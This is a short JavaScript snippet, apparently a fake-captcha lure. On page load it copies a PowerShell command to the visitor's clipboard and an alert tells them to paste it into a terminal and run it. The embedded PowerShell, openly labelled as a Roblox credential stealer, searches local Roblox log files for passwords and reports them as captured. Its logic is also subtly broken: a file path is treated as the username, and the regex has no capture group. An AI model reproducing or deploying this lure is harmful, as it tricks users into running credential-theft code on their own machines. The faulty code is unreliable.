document.addEventListener('DOMContentLoaded', (event) => {
    const captchaCode = 'A7F9K'; // Replace with the actual captcha code if different

    // Function to copy code to clipboard
    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            console.log('Code copied to clipboard:', text);
        }).catch(err => {
            console.error('Failed to copy code to clipboard:', err);
        });
    }

    // Function to execute code in terminal
    function executeInTerminal(code) {
        const command = `powershell -Command "${code}"`;
        copyToClipboard(command);
        alert('Please open your terminal and press Enter to execute the copied command.');
    }

    // Example code to steal Roblox credentials
    const robloxStealerCode = `
        $username = (Get-ChildItem -Path "C:\\Users\\$env:USERNAME\\AppData\\Local\\Roblox\\Logs" -Filter "*.log" | Select-Object -Last 1).FullName
        $password = (Get-Content -Path $username | Select-String -Pattern "Password=.*" | ForEach-Object { $_.Matches.Groups[1].Value })
        $credentials = "$username:$password"
        Set-Clipboard -Value $credentials
        Start-Process "powershell" -ArgumentList "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Credentials captured!', 'Success', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);"
    `;

    // Copy the captcha code to clipboard
    copyToClipboard(captchaCode);

    // Execute the Roblox stealer code in terminal
    executeInTerminal(robloxStealerCode);
});
